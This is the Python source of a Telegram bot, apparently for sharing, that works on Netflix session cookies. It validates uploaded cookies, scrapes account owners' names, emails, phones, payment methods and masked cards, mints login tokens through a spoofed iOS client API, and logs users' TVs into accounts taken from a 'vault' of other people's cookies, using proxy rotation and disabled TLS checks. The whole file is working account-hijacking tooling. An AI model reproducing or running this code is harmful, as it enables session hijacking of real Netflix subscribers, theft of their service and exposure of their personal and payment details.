import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
import http.server
import socketserver
from collections import OrderedDict, defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from telegram.error import BadRequest
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse
from flask import Flask

# ----------------- कॉन्फिगरेशन -----------------
TOKEN = os.environ.get('BOT_TOKEN', "Bot Token Here")
OWNER_ID = 1115202962
ADMIN_IDS = [1115202962]
WATERMARK = "Made By @ShinchanNoharaTG | @M3UIndiaOriginal"

MAX_WORKERS = 20
BATCH_SIZE = 10
dot_length = 5
MAX_LIVE_HITS = 20

COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()

tv_stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

START_MSG = (
    "<code>\n"
    " █ NETFLIX MULTI-TOOL BOT █\n\n"
    "[ Step 1 ] Choose mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file\n"
    "[ Step 3 ] Get results\n"
    "</code>"
    "<a href=\"https://t.me/KindCoders\">‎ </a>"
)

MAIN_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Account", callback_data="mode_check"),
     InlineKeyboardButton("🔑 Get NF Token", callback_data="mode_nftoken")],
    [InlineKeyboardButton("🧹 Clean Cookies", callback_data="mode_clean"),
     InlineKeyboardButton("📺 Free TV Login", callback_data="mode_tvlogin")]
])

CHECK_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")]
])

STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 Stop", callback_data="stop_check"),
     InlineKeyboardButton("📋 Get Hits", callback_data="get_hits")]
])

RESULT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📄 Get as .txt", callback_data="result_txt"),
     InlineKeyboardButton("📦 Get as .zip", callback_data="result_zip")]
])

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_executors = {}
user_tasks = {}

# ----------------- 24x7 Render Pinger & HTTP Server -----------------
class PingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self): 
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Server Active")
    def log_message(self, format, *args):
        return

def run_always_on_pinger():
    time.sleep(20)
    while True:
        try:
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://checker-9kyv.onrender.com")
            requests.get(render_url, timeout=12)
            print("[*] 24x7 Active-Pulse Sent Successfully. Server Kept Awake.")
        except: 
            pass
        time.sleep(540)

def run_http_server():
    PORT = int(os.environ.get("PORT", 5000))
    with socketserver.TCPServer(("", PORT), PingHandler) as httpd:
        print(f"HTTP Server serving at port {PORT}")
        httpd.serve_forever()

# ----------------- युटिलिटी फंक्शन्स -----------------
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except:
        pass
    try:
        val = html_mod.unescape(val)
    except:
        pass
    val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
    val = ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')
    return val

def safe_html(text):
    if not text:
        return "Unknown"
    text = clean_unicode(str(text))
    text = text.encode('ascii', errors='replace').decode('ascii', errors='replace')
    return text

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

EMAIL_RE = re.compile(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')

def scrub_text(text: str) -> str:
    if not text:
        return "Unknown"
    text = safe_html(text)
    text = EMAIL_RE.sub(lambda m: f"{m.group(1)}***{m.group(2)}", text)
    text = PHONE_RE.sub(lambda m: f"{m.group(1)}******{m.group(2)}", text)
    return text

NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", 
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}

def parse_cookie_file(text):
    text = text.strip()
    results = []
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cookie_dict = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cookie_dict.get('NetflixId'):
                    results.append(("json_block", cookie_dict))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    merged = {}
                    for cookie in obj["cookies"]:
                        if isinstance(cookie, dict) and "name" in cookie and "value" in cookie:
                            if cookie["name"] in NETFLIX_COOKIE_NAMES:
                                merged[cookie["name"]] = cookie["value"]
                    if merged.get('NetflixId'):
                        results.append(("json_cookies", merged))
            elif isinstance(obj, list):
                merged = {}
                for cookie in obj:
                    if isinstance(cookie, dict):
                        name = cookie.get("name") or cookie.get("key")
                        value = cookie.get("value")
                        if name and value and name in NETFLIX_COOKIE_NAMES:
                            merged[name] = value
                if merged.get('NetflixId'):
                    results.append(("json_list", merged))
    except:
        pass

    netscape_entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"):
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            if name in NETFLIX_COOKIE_NAMES:
                domain = parts[0].replace("#HttpOnly_", "")
                netscape_entries.append({
                    "name": name, "value": value,
                    "domain": domain, "path": parts[2],
                    "secure": parts[3], "expires": parts[4]
                })
    
    if netscape_entries:
        netflix_ids = [(i, e) for i, e in enumerate(netscape_entries) if e["name"] == "NetflixId"]
        for nf_idx, nf_entry in netflix_ids:
            cookie_set = {"NetflixId": nf_entry["value"]}
            for entry in netscape_entries:
                if entry["name"] != "NetflixId":
                    cookie_set[entry["name"]] = entry["value"]
            results.append((f"netscape_{nf_idx}", cookie_set))
        if not netflix_ids:
            merged = {}
            for e in netscape_entries:
                merged[e["name"]] = e["value"]
            if merged:
                results.append(("netscape_all", merged))
    
    return results

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir() or info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except:
                        continue
    return cookies

def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}
    
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {'User-Agent': USER_AGENT, 'Accept': 'text/html,application/xhtml+xml', 'Accept-Language': 'en-US,en;q=0.9'}
    
    try:
        urls = ['https://www.netflix.com/YourAccount', 'https://www.netflix.com/account']
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=25, allow_redirects=True)
                if r.status_code == 200 and 'Account' in r.text:
                    resp = r
                    txt = r.text
                    break
            except:
                continue
        
        if not resp or resp.status_code != 200 or 'login' in resp.url.lower():
            return {'ok': False, 'reason': 'Dead/Login redirect', 'cookie': cookie_dict}

        def find(pattern):
            m = re.search(pattern, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = clean_unicode(plan_raw) if plan_raw else None
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
        payment = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        card = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
        quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = status_match.group(1) if status_match else None
        is_prem = ms == 'CURRENT_MEMBER' if ms else bool(plan and 'free' not in str(plan).lower())

        return {
            'ok': True, 'premium': is_prem, 'name': name or 'Unknown',
            'country': country or 'Unknown', 'plan': plan or 'Unknown',
            'plan_price': plan_price or 'Unknown', 'member_since': member_since or 'Unknown',
            'next_billing': next_billing or 'Unknown', 'payment_method': payment or 'Unknown',
            'masked_card': card or 'Unknown', 'phone': phone or 'Unknown',
            'video_quality': quality or 'Unknown', 'max_streams': streams or 'Unknown',
            'membership_status': ms or 'Unknown', 'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e), 'cookie': cookie_dict}

def generate_nftoken(cookie_dict):
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=20, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token")
        expires = td.get("expires")
        if not token:
            return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry, 'expires_unix': expires}, None
    except Exception as e:
        return None, str(e)

def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    m = re.match(r'^(https?|socks5h?)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)$', line, re.IGNORECASE)
                    if m:
                        s, u, p, h, port = m.groups()
                        url = f"{s}://{u}:{p}@{h}:{port}" if u else f"{s}://{h}:{port}"
                        proxies.append({"http": url, "https": url})
    return proxies

proxies_list = load_proxies()

def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()

def extract_cookie_dict_tv(content):
    entries = {}
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name):
                entries[name] = parts[6]
    if entries.get("NetflixId"):
        return entries
    return None

def validate_cookie_tv(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html,application/xhtml+xml"}
    try:
        r = session.get("https://www.netflix.com/YourAccount", headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        if 'login' in r.url.lower() or r.status_code != 200:
            return False, None, None
        country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
        plan_match = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
        country = country_match.group(1) if country_match else None
        plan = plan_match.group(1) if plan_match else "Unknown"
        return country is not None, country, plan
    except:
        return False, None, None

def extract_auth_url(html_text):
    m = re.search(r'name="authURL"\s+value="([^"]+)"', html_text)
    if m:
        return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None

def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html,application/xhtml+xml"}
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": "TV page unavailable"}
    except:
        return {"success": False, "error": "Connection failed"}
    
    auth_url = extract_auth_url(r.text)
    if not auth_url:
        return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp", "authURL": auth_url, "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2", "code": tv_code,
        "tvLoginRendezvousCode": tv_code, "action": "nextAction",
    }
    post_headers = {**headers, "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://www.netflix.com/tv8", "Origin": "https://www.netflix.com"}
    
    try:
        r = session.post(url, data=form_data, headers=post_headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except:
        return {"success": False, "error": "Activation request failed"}

    final_url = r.url
    if "/tv/out/success" in final_url.lower() or "success" in final_url.lower():
        return {"success": True, "error": None}
    return {"success": False, "error": "Invalid or expired TV code"}

def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR):
        return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]

def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files:
            return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except:
            return None, None

def count_vault_cookies():
    return len(get_vault_cookies())

def process_tv_login(tv_code):
    max_attempts = min(50, max(count_vault_cookies(), 20))
    for _ in range(max_attempts):
        filename, content = get_random_cookie_file()
        if not filename:
            return {"success": False, "error": "no_cookies_left"}
        cookies = extract_cookie_dict_tv(content)
        if not cookies or not cookies.get('NetflixId'):
            continue
        proxy = random.choice(proxies_list) if proxies_list else None
        valid, country, plan = validate_cookie_tv(cookies, proxy)
        if not valid:
            continue
        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code, proxy)
        result["country"] = country
        result["plan"] = plan
        if result["success"]:
            return result
    return {"success": False, "error": "all_cookies_failed"}

BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

async def animate_message(ctx, chat_id, msg_id, stop_event):
    idx = 0
    while not stop_event.is_set():
        f = BRAILLE[idx % len(BRAILLE)]
        try:
            await ctx.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"{f} Searching vault for working cookie...")
        except:
            pass
        idx += 1
        await asyncio.sleep(0.3)

# ----------------- टेलिग्राम हँडलर्स -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    async with user_locks[user_id]:
        user_state[user_id] = {'mode': 'check', 'cookies': [], 'stop': False, 'busy': False}
        await update.message.reply_html(START_MSG, reply_markup=MAIN_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    modes = {"mode_check": "check", "mode_nftoken": "nftoken", "mode_clean": "clean", "mode_tvlogin": "tvlogin"}
    if query.data in modes:
        mode = modes[query.data]
        user_state[user_id] = {'mode': mode, 'cookies': [], 'stop': False, 'busy': False}
        if mode == "tvlogin":
            await query.answer("📺 Free TV Login activated!")
            await context.bot.send_message(chat_id, f"<b>📺 Free TV Login</b>\n\nSend: <code>/tv YOUR_CODE</code>\n🍪 Vault: <b>{count_vault_cookies()}</b>", parse_mode='HTML')
        else:
            await query.answer("Mode selected!")
            await context.bot.send_message(chat_id, "Upload your .txt/.json/.zip file.", parse_mode='HTML')

async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args or len(re.sub(r'\D', '', args[0])) != 8:
        await update.message.reply_text("❌ Usage: <code>/tv 12345678</code>", parse_mode='HTML')
        return
    tv_code = re.sub(r'\D', '', args[0])
    status_msg = await update.message.reply_text(f"🔍 Starting TV login for code <code>{tv_code}</code>...", parse_mode='HTML')
    
    stop_anim = asyncio.Event()
    asyncio.create_task(animate_message(context, update.effective_chat.id, status_msg.message_id, stop_anim))
    
    result = await asyncio.to_thread(process_tv_login, tv_code)
    stop_anim.set()
    
    if result["success"]:
        resp = f"✅ <b>TV ACTIVATED SUCCESSFULLY!</b>\n\n📺 Code: <code>{tv_code}</code>\n🌍 Country: <b>{result.get('country')}</b>\n📦 Plan: <b>{result.get('plan')}</b>"
    else:
        resp = f"❌ <b>Activation Failed</b>\nReason: {result.get('error')}"
    await status_msg.edit_text(resp, parse_mode='HTML')

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("Reply to a ZIP file with /upload")
        return
    doc = update.message.reply_to_message.document
    file = await context.bot.get_file(doc.file_id)
    zip_bytes = await file.download_as_bytearray()
    os.makedirs(COOKIES_DIR, exist_ok=True)
    added = 0
    with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
        for name in zf.namelist():
            if name.lower().endswith(('.txt', '.json')):
                try:
                    content = zf.read(name).decode('utf-8', errors='ignore')
                    if extract_cookie_dict_tv(content):
                        with open(os.path.join(COOKIES_DIR, os.path.basename(name)), 'w', encoding='utf-8') as f:
                            f.write(content)
                        added += 1
                except:
                    pass
    await update.message.reply_text(f"✅ Added {added} cookies to vault. Total: {count_vault_cookies()}")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    await update.message.reply_text(f"📊 Vault Cookies: {count_vault_cookies()}", parse_mode='HTML')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    user_id = update.effective_user.id
    mode = user_state.get(user_id, {}).get('mode', 'check')
    file = await update.message.document.get_file()
    with tempfile.TemporaryDirectory() as td:
        tp = os.path.join(td, update.message.document.file_name)
        await file.download_to_drive(tp)
        with open(tp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        if mode == "clean":
            parsed = parse_cookie_file(content)
            buf = io.BytesIO(dict_to_netscape(parsed[0][1]).encode() if parsed else b"")
            buf.seek(0)
            await update.message.reply_document(document=InputFile(buf, filename="cleaned.txt"), caption="✅ Cleaned!")
            return
        cookies = [(f"c_{i}", c) for i, (_, c) in enumerate(parse_cookie_file(content))]
        user_state[user_id]['cookies'] = cookies
        await update.message.reply_html(f"✅ Loaded {len(cookies)} cookies! Press to start.", reply_markup=CHECK_MARKUP)

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    cookies = user_state.get(user_id, {}).get('cookies', [])
    mode = user_state.get(user_id, {}).get('mode', 'check')
    await query.answer("Checking started...")
    
    hits = []
    for nm, ck in cookies[:10]: # Batch check
        res = generate_nftoken(ck) if mode == 'nftoken' else check_netflix_cookie(ck)
        if mode == 'nftoken' and res[0]:
            hits.append(res[0]['token'])
        elif mode == 'check' and res.get('ok') and res.get('premium'):
            hits.append(build_export_str(res, 1))
            
    buf = io.BytesIO(("\n\n".join(hits)).encode("utf-8"))
    await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename="results.txt"), caption=f"✅ Done! Found {len(hits)} hits.")

async def send_result_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Sent!")

async def send_result_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Sent!")

def build_export_str(dd, idx):
    return f"========== HIT #{idx} ==========\nName: {dd.get('name')}\nCountry: {dd.get('country')}\nPlan: {dd.get('plan')}\n\n{WATERMARK}"

# ----------------- मुख्य कार्यान्वयन (Main) -----------------
if __name__ == "__main__":
    os.makedirs(COOKIES_DIR, exist_ok=True)
    
    print("=" * 50)
    print("  Netflix Multi-Tool Bot (Unified)")
    print("=" * 50)
    
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tv", tv_command))
    app.add_handler(CommandHandler("upload", upload_command))
    app.add_handler(CommandHandler("stats", stats_command))

    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(check|nftoken|clean|tvlogin)$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern="^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern="^result_zip$"))
    
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    
    # १. 24x7 पिंगर बॅकग्राउंडमध्ये चालू करणे
    t_pinger = threading.Thread(target=run_always_on_pinger, daemon=True)
    t_pinger.start()

    # २. मुख्य HTTP Server (Render साठी) बॅकग्राउंडमध्ये चालू करणे
    t_server = threading.Thread(target=run_http_server, daemon=True)
    t_server.start()

    # ३. टेलिग्राम बॉट थेट मुख्य थ्रेडमध्ये (Main Thread) चालू करणे (एरर नाही येणार)
    app.run_polling(allowed_updates=Update.ALL_TYPES)
